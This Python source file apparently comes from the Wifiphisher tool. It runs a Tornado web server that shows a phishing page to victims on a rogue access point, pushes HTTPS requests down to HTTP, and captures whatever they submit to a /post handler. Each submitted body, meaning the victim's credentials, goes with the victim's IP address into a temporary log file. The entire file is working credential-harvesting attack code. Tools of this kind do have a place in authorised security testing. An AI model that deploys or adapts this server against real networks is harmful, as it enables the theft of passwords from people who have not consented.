import tornado.ioloop
import tornado.web
from constants import *

template = False
terminate = False


class DowngradeToHTTP(tornado.web.RequestHandler):

    def get(self, url):
        self.redirect("http://10.0.0.1:8080/")


class ShowPhishingPageHandler(tornado.web.RequestHandler):

    def get(self, url):
        if "/" in url:
            self.redirect("/index")
        self.render("index.html", **template.get_context())
        wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
        with open(wifi_webserver_tmp, "a+") as log_file:
            log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
                           self.request.remote_ip + W + "\n"
                           )
            log_file.close()


class ReceiveCredsHandler(tornado.web.RequestHandler):

    def post(self):
        self.redirect("/loading")
        wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
        with open(wifi_webserver_tmp, "a+") as log_file:
            log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
                           T + self.request.remote_ip + " " +
                           R + repr(self.request.body) +
                           W + "\n"
                           )
            log_file.close()
        global terminate
        terminate = True


class ShowLoadingPageHandler(tornado.web.RequestHandler):

    def get(self):
        self.render("loading.html", **template.get_context())


def runHTTPServer(ip, port, ssl_port, t):
    global template
    template = t
    app = tornado.web.Application(
        [
            (r"/post", ReceiveCredsHandler),
            (r"/loading", ShowLoadingPageHandler),
            (r"/(.*)", ShowPhishingPageHandler)
        ],
        template_path=template.get_path(),
        static_path=template.get_path_static(),
        compiled_template_cache=False
    )
    app.listen(port, address=ip)

    ssl_app = tornado.web.Application(
        [
            (r"/(.*)", DowngradeToHTTP)
        ]
    )
    https_server = tornado.httpserver.HTTPServer(ssl_app, ssl_options={
        "certfile": PEM,
        "keyfile": PEM,
    })
    https_server.listen(ssl_port, address=ip)

    tornado.ioloop.IOLoop.instance().start()
